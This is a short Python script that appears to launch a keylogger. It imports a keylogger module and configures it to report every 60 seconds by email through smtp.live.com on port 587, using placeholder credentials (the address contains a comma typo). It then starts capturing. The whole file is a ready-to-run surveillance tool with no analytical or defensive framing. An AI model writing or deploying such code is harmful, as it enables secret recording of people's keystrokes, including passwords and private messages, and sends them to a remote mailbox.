#! /usr/bin/env python

import keylogger

keylogger = keylogger.Keylogger(60, "test@live,com", "test!", "smtp.live.com", 587)
keylogger.start()
